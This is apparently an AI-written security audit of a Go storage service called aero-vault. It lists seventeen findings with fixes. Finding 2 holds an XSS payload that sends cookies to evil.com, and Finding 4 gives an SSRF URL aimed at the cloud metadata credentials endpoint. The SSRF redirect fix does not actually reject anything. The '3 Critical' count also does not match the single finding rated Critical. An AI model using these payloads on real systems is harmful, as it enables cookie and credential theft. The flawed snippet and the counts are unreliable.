Now I have a comprehensive picture. Let me compile the complete security review.

---

# 🔒 Aero-Vault: Principal Security Engineer Review

## Overall Security Posture: **Needs Improvement**

The codebase shows strong security awareness — HMAC-signed webhooks, envelope encryption with key rotation, hashed API key storage, and tenant isolation are well-implemented. However, several critical gaps in defensive depth make the system vulnerable in adversarial production conditions.

**Risk scoring:** 3 Critical · 5 High · 6 Medium · 3 Low · 1 Info

---

## Summary of Findings

### Top 3 Most Critical Issues

| # | Finding | Severity | Effort |
|---|---------|----------|--------|
| 1 | **No TLS by default** — credentials in cleartext on the wire | Critical | M |
| 2 | **Stored Content-Disposition XSS** — user-supplied headers echo'd verbatim to browsers | High | S |
| 3 | **SQL LIKE wildcard injection** — key enumeration through prefix parameter | High | S |

### Top 3 Quick Wins (High Impact, Low Effort)

| # | Finding | Fix Time |
|---|---------|----------|
| 1 | Add security headers middleware (`X-Content-Type-Options`, `X-Frame-Options`, `CSP`) | 1 hour |
| 2 | Escape `%`/`_` in SQL LIKE queries or switch to range scan | 30 min |
| 3 | Reject default presign key `change-me` at startup | 15 min |

---

## Full Finding Register

### Finding 1: No TLS by Default

| Field | Value |
|-------|-------|
| Category | Cryptography / Data Protection |
| Severity | **Critical** |
| Title | Plaintext HTTP only — no TLS support |
| Location | `internal/config/config.go:31`, `cmd/server/main.go:263` |
| Description | The server binds to `:8080` with plain HTTP. No TLS configuration options exist. All API keys, JWT tokens, SigV4 credentials, and stored content traversing the network are in cleartext. |
| Attack Scenario | Attacker on same network segment (cloud VPC, Wi-Fi, ISP) passively captures HTTP traffic, extracts `Authorization: Bearer <token>` headers, and assumes the authenticated identity. |
| Impact | Complete credential compromise, data breach, unauthorized tenant access |
| Recommendation | Add `TLS_CERT_FILE` / `TLS_KEY_FILE` config options with `http.Server.TLSConfig`. Document that TLS proxy (nginx/Envoy) is mandatory in production. Fail startup if credentials are configured without TLS. |
| NIST Reference | SC-8: Transmission Confidentiality and Integrity |
| Effort | M |

---

### Finding 2: Content-Disposition Reflected XSS

| Field | Value |
|-------|-------|
| Category | Input Validation / Data Protection |
| Severity | **High** |
| Title | User-controlled Content-Disposition echoed verbatim in response headers |
| Location | `internal/api/rest/handler.go:882-884`, `internal/api/s3compat/handler.go:653-654` |
| Description | `Content-Disposition` from PUT requests is stored in metadata as `_aero_content_disposition` and returned verbatim in GET/HEAD responses. No encoding, CRLF filtering, or validation is applied. An attacker can inject CRLF sequences to split HTTP responses (HTTP response splitting) or inject JavaScript via `filename="><script>alert(1)</script>"` when combined with `text/html` content-type. |
| Attack Scenario | **1.** Attacker PUTs object with `Content-Disposition: attachment; filename="><script>document.location='https://evil.com/?c='+document.cookie</script>"` **2.** Victim GETs object via browser **3.** If server returns `text/html` (or no Content-Type), script executes stealing cookies |
| Impact | Stored XSS, cookie theft, session hijacking, credential exfiltration |
| Recommendation | ```go
func sanitizeContentDisposition(v string) string {
    // Strip CR/LF to prevent HTTP response splitting
    v = strings.ReplaceAll(strings.ReplaceAll(v, "\r", ""), "\n", "")
    // Only allow safe filename values via mime.FormatMediaType
    if _, params, err := mime.ParseMediaType("attachment; "+v); err == nil {
        return mime.FormatMediaType("attachment", params)
    }
    return "attachment"
}
``` |
| OWASP Mapping | A03:2021 (Injection), A04:2021 (Insecure Design) |
| Effort | S |

---

### Finding 3: SQL LIKE Wildcard Injection

| Field | Value |
|-------|-------|
| Category | Input Validation |
| Severity | **High** |
| Title | User-supplied prefix in `LIKE` query allows key enumeration |
| Location | `internal/repository/sql_objects.go:174-176` |
| Description | `WHERE key LIKE $3 AND key > $4` uses `prefix+"%"` as the LIKE parameter. The SQL `%` and `_` characters are treated as wildcards. A prefix of `%` matches all keys; `_` matches any single character, enabling character-by-character brute-force of key patterns. |
| Attack Scenario | **1.** Send `GET /v1/files?prefix=%25` → `LIKE '%'` returns all objects regardless of tenant/bucket prefix **2.** Send `GET /v1/files?prefix=_.secret_` to brute-force single-character positions of hidden keys |
| Impact | Object key enumeration, information disclosure of file names and organizational structure |
| Recommendation | **Option A:** Escape prefix wildcards: `strings.ReplaceAll(strings.ReplaceAll(prefix, "%", "\\%"), "_", "\\_")` **Option B (preferred):** Replace LIKE with range scan: `WHERE key >= $3 AND key < $4` where `$4 = prefix + '\xFF'`. This is faster and not vulnerable to wildcards. |
| OWASP Mapping | A03:2021 (Injection) |
| Effort | S |

---

### Finding 4: Webhook SSRF

| Field | Value |
|-------|-------|
| Category | Threat Model |
| Severity | **High** |
| Title | No URL validation or redirect restrictions on webhook target |
| Location | `internal/events/webhook.go:34-45`, `deliver()` |
| Description | `EVENTS_WEBHOOK_URL` accepts arbitrary URLs. The HTTP client follows redirects (default `http.Client` behavior) with no IP restrictions. An admin-level attacker can pivot the server into internal networks via SSRF. The event payload contains object metadata including keys and request IDs. |
| Attack Scenario | Set `EVENTS_WEBHOOK_URL=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role` (AWS metadata). Object create triggers POST, exfiltrating cloud provider IAM credentials. |
| Impact | Internal network reconnaissance, cloud metadata theft, infrastructure pivot |
| Recommendation | ```go
// In webhook client setup:
transport := &http.Transport{
    DialContext: (&net.Dialer{
        Control: func(network, address string, c syscall.RawConn) error {
            host, _, _ := net.SplitHostPort(address)
            ip := net.ParseIP(host)
            if ip != nil && (ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast()) {
                return errors.New("refusing connection to private IP")
            }
            return nil
        },
    }).DialContext,
}
w.client = &http.Client{
    Transport: transport,
    Timeout:   5 * time.Second,
    CheckRedirect: func(req *http.Request, via []*http.Request) error {
        if len(via) >= 5 { return http.ErrUseLastResponse }
        host, _, _ := net.SplitHostPort(req.URL.Host)
        // Reject redirects to private IPs
        return nil
    },
}
``` |
| OWASP Mapping | A01:2021 (Broken Access Control — SSRF) |
| Effort | M |

---

### Finding 5: Unauthenticated Tenant Used for Rate Limiting

| Field | Value |
|-------|-------|
| Category | Authorization / Threat Model |
| Severity | **Medium** |
| Title | Rate limiter trusts unauthenticated `X-Aero-Tenant` header |
| Location | `cmd/server/main.go:applyMiddleware`, `internal/middleware/middleware.go:Tenant`, `internal/auth/auth_middleware.go:authenticateBearer` |
| Description | Middleware execution order: AccessLog → … → RateLimit → **Tenant** → **Auth** → CORS → RequestID. The `Tenant` middleware runs **before** `Auth`, extracting the client-supplied `X-Aero-Tenant` header into context. The `Auth` middleware runs inside, and when the key's tenant is specific, it sets the HTTP header but **does not update the context value**. The rate limiter uses `TenantFrom(ctx)`, which reads the unauthenticated value. |
| Attack Scenario | Attacker authenticates with a key for tenant `acme`, but sends `X-Aero-Tenant: competitor`. The rate limiter deducts from `competitor`'s bucket, not `acme`'s. This allows DoS against any tenant's rate limit. The attacker could also impersonate a different tenant to consume its AI budget. |
| Impact | Rate limit bypass / budget theft across tenants |
| Recommendation | Move Tenant middleware to run AFTER Auth, or have Auth update the context tenant value after verifying the key. The safest fix is to refactor the order to: `Auth → Tenant` (auth verifies identity, then tenant is pinned from the authenticated key). |
| Effort | S |

---

### Finding 6: Missing Security Headers

| Field | Value |
|-------|-------|
| Category | Compliance / Data Protection |
| Severity | **Medium** |
| Title | Zero security hardening headers |
| Location | Global — `cmd/server/main.go:applyMiddleware` |
| Description | No `X-Content-Type-Options: nosniff`, `X-Frame-Options`, `Content-Security-Policy`, `Strict-Transport-Security`, `Referrer-Policy`, or `Permissions-Policy` headers are set on any response. The `/ui` SPA is similarly unprotected. |
| Attack Scenario | Victim visits a malicious site that frames the aero-vault UI (clickjacking to trick admin into creating a key). MIME-type confusion attacks against file uploads. |
| Impact | Clickjacking, MIME confusion, UI redress attacks |
| Recommendation | Add a middleware that stamps: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, and for `/ui`, a strict CSP. |
| OWASP Mapping | A05:2021 (Security Misconfiguration), A04:2021 (Insecure Design) |
| Effort | S |

---

### Finding 7: JWTs Signed with HS256 — Admin Can Forge Unlimited Tokens

| Field | Value |
|-------|-------|
| Category | Cryptography / Authorization |
| Severity | **High** |
| Title | Symmetric JWT key shared between signing and verification |
| Location | `internal/auth/jwt.go`, `internal/api/rest/admin.go:146-176` |
| Description | `AUTH_JWT_SECRET` is used for both issuing and verifying tokens via HS256. The admin `/v1/admin/jwt` endpoint exposes token signing with no TTL cap. Anyone with admin scope can mint tokens that are valid for any tenant (including `*`), with any scopes (including `admin`), for any duration. |
| Attack Scenario | Compromised admin key calls `POST /v1/admin/jwt {"tenant":"*","scopes":["admin"],"ttl_seconds":315360000}` — produces a token valid for 10 years with super-admin privileges pinned to `AUTH_JWT_SECRET`. Even after the admin key is revoked, the JWT remains valid. |
| Impact | Permanent privilege escalation, cross-tenant admin access |
| Recommendation | 1. **Immediate:** Cap TTL to 24h max: `if c.TTL <= 0 || c.TTL > 86400 { return error }` 2. **Medium-term:** Add support for RS256/ES256 so the signing key is offline and only verification keys live on the server 3. **Documentation:** Clearly state that HS256 means the server can sign any claims — the admin token endpoint is the root of trust |
| Effort | S (TTL cap) / L (asymmetric) |

---

### Finding 8: Default Presign Key Allows URL Forgery

| Field | Value |
|-------|-------|
| Category | Cryptography |
| Severity | **High** |
| Title | Presigned URL HMAC key defaults to `change-me` |
| Location | `.env:7`, `internal/storage/sign.go`, `internal/storage/local.go` |
| Description | The actual `.env` file in the project root has `STORAGE_LOCAL_SIGN_KEY=change-me`. The presigned URL scheme uses HMAC-SHA256 with this key. Deploying with this value enables anyone who knows it (including from a public repo commit) to forge valid GET/PUT presigned URLs for any object. |
| Attack Scenario | Attacker discovers key `change-me` from the repo, computes `HMAC-SHA256("change-me", "PUT\nsome-key\n3600")`, crafts a presigned URL, and uploads arbitrary content to the server. |
| Impact | Unauthenticated read/write access to all objects |
| Recommendation | In `buildStorageFrom` or config validation: `if sc.Local.SignKey == "change-me" || sc.Local.SignKey == "" { return nil, errors.New("STORAGE_LOCAL_SIGN_KEY must be a strong random key; default 'change-me' is rejected") }` |
| Effort | S |

---

### Finding 9: Information Disclosure via Error Messages

| Field | Value |
|-------|-------|
| Category | Data Protection |
| Severity | **Medium** |
| Title | Raw Go error messages exposed in API responses |
| Location | `internal/api/rest/handler.go:306-308` — `classify()` default case |
| Description | Unclassified errors return `err.Error()` as the API response body. This exposes SQL constraint messages, file paths, internal implementation details, and stack traces to API consumers. |
| Attack Scenario | Sending an invalid object key that triggers a database uniqueness violation returns: `{"code":"InternalError","message":"UNIQUE constraint failed: objects.tenant_id, bucket, key"}` — revealing the schema column names. |
| Impact | Information leakage of architecture, schema, and internals |
| Recommendation | Replace the default case with a generic message and log the full error server-side: ```go
default:
    slog.Error("unexpected error", "err", err, "request_id", mw.RequestIDFrom(r.Context()))
    return "InternalError", "internal server error", http.StatusInternalServerError
``` |
| OWASP Mapping | A05:2021 (Security Misconfiguration) |
| Effort | S |

---

### Finding 10: Anonymous Public-Read Bypass via S3 Endpoint

| Field | Value |
|-------|-------|
| Category | Authorization |
| Severity | **Medium** |
| Title | S3 GetObject/HeadObject missing anonymous ACL check |
| Location | `internal/api/s3compat/handler.go:133-185` (GetObject), `cmd/server/main.go:authReg.WithAnonymousPublicRead()` |
| Description | When `AUTH_ANONYMOUS_PUBLIC_READ=true`, the REST handler calls `allowAnonymous()` which checks ACL-gated public-read access. The S3-compatible handler's `GetObject` and `HeadObject` have no such check. An anonymous S3 request bypasses ACL enforcement. |
| Attack Scenario | 1. Object ACL is set to `private` 2. Attacker without credentials sends `GET /s3/bucket/key` with no Authorization header 3. The S3 handler processes the request without `IsAnonymous()` check and returns the object |
| Impact | ACL bypass for S3 endpoint when anonymous read is enabled |
| Recommendation | Add the same `IsAnonymous` check to S3 handlers: ```go
func (h *Handler) allowAnonymousS3(w http.ResponseWriter, r *http.Request, bucket, key string) bool {
    if !auth.IsAnonymous(r.Context()) { return true }
    if h.svc.ObjectPublicReadable(r.Context(), mw.TenantFrom(r.Context()), bucket, key) { return true }
    writeS3Error(w, r, service.ErrForbidden)
    return false
}
``` |
| Effort | S |

---

### Finding 11: No Input Size Limits on Storage Layer

| Field | Value |
|-------|-------|
| Category | Denial of Service |
| Severity | **Medium** |
| Title | Unbounded object sizes accepted by service layer |
| Location | `internal/service/file_crud.go:Put()` — no server-side max-size check |
| Description | The `FileService.Put()` accepts any object size. The MCP `write_file` tool passes content as a string also without size limits. An attacker (or compromised AI agent) can write multi-GB objects to exhaust storage. |
| Attack Scenario | MCP agent calls `write_file` with `content` = 100GB string literal, consuming all available disk space. |
| Impact | Storage exhaustion, denial of service |
| Recommendation | Add a configurable `MAX_OBJECT_SIZE` (default e.g. 100MB) enforced at the service layer before storage write: ```go
const DefaultMaxObjectSize int64 = 100 * 1024 * 1024
if size > DefaultMaxObjectSize {
    return repository.Object{}, fmt.Errorf("%w: object size %d exceeds maximum %d", ErrInvalidArgs, size, DefaultMaxObjectSize)
}
``` |
| Effort | S |

---

### Finding 12: Missing Input Validation on Metadata Keys/Values

| Field | Value |
|-------|-------|
| Category | Input Validation |
| Severity | **Low** |
| Title | Metadata validation exists but allows empty keys |
| Location | `internal/service/file.go:validateMetadata()` lines 67-91 |
| Description | `validateMetadata` checks key/value length limits (256/64KB) but doesn't prevent empty keys (`""`), or keys with control characters. A PUT with `{"":"value"}` creates metadata with an empty-string key, which may cause issues in downstream consumers. |
| Attack Scenario | Upload file with metadata `{"":"malicious"}` — the empty key round-trips through JSON serialization and may confuse S3 API clients or trigger edge cases in the storage backend. |
| Impact | Low — metadata consistency issues |
| Recommendation | Add validation: `if k == "" { return fmt.Errorf(...) }` and optionally reject control characters in keys. |
| Effort | S |

---

### Finding 13: API Key Hash is Unsalted SHA-256

| Field | Value |
|-------|-------|
| Category | Cryptography |
| Severity | **Low** |
| Title | No salt in API key hashing |
| Location | `internal/auth/store.go:36-38` — `HashToken()` |
| Description | Persisted API keys are hashed with bare `sha256.Sum256` — no salt, no iteration count. While API keys are high-entropy (16+ byte random), this is defense-in-depth weakness. If the DB is compromised, pre-computed tables accelerate cracking of weak keys. |
| Attack Scenario | Attacker reads `api_keys` table from backup or SQL injection, extracts hashes, builds SHA-256 rainbow table for common key patterns, recovers a subset of API keys. |
| Impact | Limited — requires DB access and weak keys |
| Recommendation | Add a random 16-byte salt per key and use `HMAC-SHA256(salt, key)` or `SHA-256(salt + key)`. Store salt alongside hash. |
| Effort | S |

---

### Finding 14: Admin Audit Log Leaks Token Suffix

| Field | Value |
|-------|-------|
| Category | Data Protection |
| Severity | **Low** |
| Title | API key suffix visible in audit log |
| Location | `internal/api/rest/admin.go:400-404` — `redactToken()` |
| Description | `redactToken` returns `****` + last 4 chars. The audit log for `key.add` records this partially redacted token. If the token space is small or pattern is predictable, 4 known characters accelerate brute-force. |
| Attack Scenario | New key `sk-abc123` appears in audit as `****123`. Attacker knows the prefix `sk-` and 4 suffix chars, reducing brute-force from `52^6` to `52^2` possibilities. |
| Impact | Low — only aids brute-force with prior knowledge of key format |
| Recommendation | Use a cryptographic hash prefix instead: `hex(sha256(token))[:8]` for correlation in audit logs. |
| Effort | S |

---

### Finding 15: Admin API Key/JWT Creation Unrate-Limited

| Field | Value |
|-------|-------|
| Category | Denial of Service |
| Severity | **Medium** |
| Title | No dedicated rate limiting on key/tenant creation endpoints |
| Location | `internal/api/rest/admin.go` — AddKey, IssueJWT, CreateTenant |
| Description | Admin mutation endpoints share the global rate limiter but have no per-endpoint limiting. A compromised admin key can generate unlimited API keys or JWTs, exhausting DB storage or creating a management nightmare. |
| Attack Scenario | Compromised admin key calls `POST /v1/admin/keys` 100,000 times, creating 100K persisted API key rows in the database. |
| Impact | Database bloat, degraded performance, key management chaos |
| Recommendation | Add per-endpoint rate limiting: `adminRL := middleware.NewRateLimiter(1, 2)` and apply only to admin mutation routes. |
| Effort | S |

---

### Finding 16: JWT `nbf` (Not Before) Claim Can Be Set in the Future

| Field | Value |
|-------|-------|
| Category | Authorization |
| Severity | **Low** |
| Title | JWT can be minted with a future `nbf` — current implementation correctly validates it |
| Location | `internal/auth/jwt.go:123-125` |
| Description | The JWT verifier checks `nbf > 0 && now < nbf` — correct behavior. The admin JWT signing endpoint does not expose `nbf` directly, but `go jwt.Sign` sets `nbf = now` by default. No vulnerability, but worth noting for completeness. |
| Impact | None with current implementation |
| Recommendation | Document that `nbf` is stamped to current time and is not controllable by the caller. |
| Effort | N/A |

---

### Finding 17: In-Memory Key Cache Evicts Arbitrary Entry When Full

| Field | Value |
|-------|-------|
| Category | Availability |
| Severity | **Low** |
| Title | Key cache eviction policy could remove actively used entries |
| Location | `internal/auth/key_cache.go:73-75` |
| Description | When cache capacity is reached, the `put` method evicts an arbitrary entry (first key from `range` iteration over a map). This is non-deterministic and could evict a hot key, causing unnecessary DB lookups. |
| Attack Scenario | Attacker sends requests with many unique token hashes, filling the cache and evicting active entries. Legitimate users experience increased latency due to DB round-trips. |
| Impact | Performance degradation under cache pressure |
| Recommendation | Implement an LRU eviction policy instead of random eviction. |
| Effort | M |

---

## STRIDE Threat Model Summary

| Category | Risk | Key Findings |
|----------|------|-------------|
| **S**poofing | **Medium** | SigV4 verification uses HMAC comparison (safety). JWT HS256 symmetric — server can forge any claims. |
| **T**ampering | **Medium** | SSE envelope integrity via AES-GCM. Content-MD5 verification on upload. No ETag verification on read by default. |
| **R**epudiation | **Low** | Admin audit logging captures actor, action, target. No client IP in audit records. |
| **I**nformation Disclosure | **High** | SQL LIKE wildcard allows key enumeration. Internal errors in API responses. No TLS means traffic visible. |
| **D**enial of Service | **High** | No max object size. Unlimited admin key creation. No concurrency limit on per-tenant basis by default. |
| **E**levation of Privilege | **Medium** | Content-Disposition XSS could lead to admin session hijack. Anonymous ACL bypass via S3 endpoint. |

---

## Compliance Gaps

| Standard | Issue | Status |
|----------|-------|--------|
| OWASP A01:2021 (BAC) | Anonymous ACL bypass via S3 endpoint | ❌ |
| OWASP A03:2021 (Injection) | SQL LIKE wildcard, Content-Disposition CRLF injection | ❌ |
| OWASP A04:2021 (Insecure Design) | No TLS, no security headers | ❌ |
| OWASP A05:2021 (Security Misconfiguration) | Error details in responses | ❌ |
| OWASP A08:2021 (Integrity Failures) | No ETag verification on read | ⚠️ |
| PCI DSS 4.0 | No TLS (Req 4.2.1), PII scan feature exists but not default | ❌ |
| SOC 2 CC6 | Access control via auth layer — implemented, but bypass present | ⚠️ |
| GDPR Art 32 | No encryption in transit by default | ❌ |

---

## Security Debt & Recommendations

### Immediate (0-2 days)
1. **Reject `change-me` presign key** at startup — 15 minutes
2. **Escape SQL LIKE wildcards** — 30 minutes
3. **Add security headers middleware** — 1 hour
4. **Add max object size enforcement** — 1 hour

### Short-term (1-2 weeks)
1. **Add TLS support** with cert config options
2. **Fix Content-Disposition XSS** with sanitization
3. **Add SSRF protections** to webhook HTTP client
4. **Fix middleware ordering** so Auth runs before Tenant
5. **Add admin endpoint rate limiting**
6. **Fix S3 anonymous ACL bypass**

### Medium-term (1-3 months)
1. **Migrate JWT to RS256/ES256** with offline signing key
2. **Add per-key salt** to API key hashing
3. **Implement LRU eviction** in key cache
4. **Content-MD5 verification on read** as optional config (already partially exists via ReadVerificationConfig)
5. **Network policy** — private IP rejection in outbound connections

---

## Conclusion

The aero-vault codebase demonstrates careful engineering around authentication, multi-tenancy, and encryption-at-rest. The envelope SSE scheme with key rotation, the HMAC-signed webhooks, and the hashed API key storage are particular strengths. However, the absence of TLS, the lack of output sanitization on Content-Disposition, and the SQL LIKE injection represent material risks that must be addressed before production deployment. The remaining findings are defense-in-depth improvements that should be prioritized based on threat model and compliance requirements.

**Final Assessment:** The project should not be deployed to production without addressing the Critical and High-severity findings. After remediation, re-review the subsystem for a revised assessment.
